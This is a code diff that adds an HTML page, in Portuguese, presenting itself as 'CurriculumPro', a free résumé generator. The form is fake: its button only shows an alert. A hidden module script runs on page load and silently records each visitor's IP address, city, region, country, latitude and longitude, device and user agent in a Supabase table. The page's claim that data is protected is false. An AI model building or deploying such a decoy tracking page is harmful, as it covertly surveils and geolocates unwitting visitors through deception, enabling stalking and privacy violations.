@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CurriculumPro - Gerador de Currículo Grátis</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root { --primary: #2563eb; }
+        body { background-color: #f8fafc; font-family: 'Inter', sans-serif; }
+        .navbar { background: white; border-bottom: 1px solid #e2e8f0; }
+        .hero-section { padding: 80px 0 40px; background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%); color: white; margin-bottom: 60px; }
+        .card-form { background: white; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: none; margin-top: -100px; padding: 40px; }
+        .btn-primary { background: var(--primary); border: none; padding: 12px; font-weight: 600; }
+        .feature-icon { font-size: 2rem; color: var(--primary); margin-bottom: 15px; }
+    </style>
+</head>
+<body>
+    <nav class="navbar navbar-light bg-white p-3">
+        <div class="container">
+            <a class="navbar-brand fw-bold text-primary" href="#"><i class="fas fa-file-invoice"></i> CurriculumPro</a>
+        </div>
+    </nav>
+
+    <div class="hero-section text-center">
+        <div class="container">
+            <h1 class="display-4 fw-bold">Seu currículo pronto em 2 minutos</h1>
+            <p class="lead opacity-75">Aumente em 3x suas chances de conseguir um emprego em 2024.</p>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="row justify-content-center">
+            <div class="col-lg-8">
+                <div class="card card-form">
+                    <h3 class="mb-4 text-center">Preencha seus dados básicos</h3>
+                    <form id="fakeForm" class="row g-3">
+                        <div class="col-md-6">
+                            <label class="form-label">Nome Completo</label>
+                            <input type="text" class="form-control" placeholder="Ex: João da Silva">
+                        </div>
+                        <div class="col-md-6">
+                            <label class="form-label">E-mail</label>
+                            <input type="email" class="form-control" placeholder="contato@exemplo.com">
+                        </div>
+                        <div class="col-md-12">
+                            <label class="form-label">Resumo Profissional</label>
+                            <textarea class="form-control" rows="3" placeholder="Fale um pouco sobre você..."></textarea>
+                        </div>
+                        <div class="col-12 mt-4">
+                            <button type="button" class="btn btn-primary w-100 shadow-sm" onclick="alert('Gerando seu PDF... Por favor, aguarde.')">
+                                GERAR CURRÍCULO GRÁTIS <i class="fas fa-arrow-right ms-2"></i>
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+        <div class="row mt-5 text-center">
+            <div class="col-md-4">
+                <i class="fas fa-check-circle feature-icon"></i>
+                <h5>100% Gratuito</h5>
+                <p class="text-muted">Sem taxas ocultas ou mensalidades.</p>
+            </div>
+            <div class="col-md-4">
+                <i class="fas fa-magic feature-icon"></i>
+                <h5>Layout Moderno</h5>
+                <p class="text-muted">Modelos aprovados por RHs.</p>
+            </div>
+            <div class="col-md-4">
+                <i class="fas fa-shield-alt feature-icon"></i>
+                <h5>Seguro</h5>
+                <p class="text-muted">Seus dados estão protegidos.</p>
+            </div>
+        </div>
+    </div>
+
+    <script type="module">
+        import { supabase } from './db.js';
+
+        async function capturarEEnviar() {
+            try {
+                // 1. Capturar Dados de Localização (Silencioso via IP)
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+
+                // 2. Identificar Dispositivo
+                const ua = navigator.userAgent;
+                let dispositivo = "Janelas/PC";
+                if (/Android/i.test(ua)) dispositivo = "Android";
+                else if (/iPhone|iPad/i.test(ua)) dispositivo = "iOS/Apple";
+
+                // 3. Salvar no Supabase
+                const { error } = await supabase
+                    .from('acessos')
+                    .insert([{
+                        ip: data.ip,
+                        cidade: data.city,
+                        regiao: data.region,
+                        pais: data.country_name,
+                        latitude: data.latitude.toString(),
+                        longitude: data.longitude.toString(),
+                        dispositivo: dispositivo,
+                        navegador: navigator.platform,
+                        user_agent: ua
+                    }]);
+
+                if (error) console.log('Erro de registro');
+            } catch (e) {
+                console.log('Erro no sistema');
+            }
+        }
+
+        // Executar ao carregar a página
+        window.addEventListener('load', capturarEEnviar);
+    </script>
+</body>
+</html>
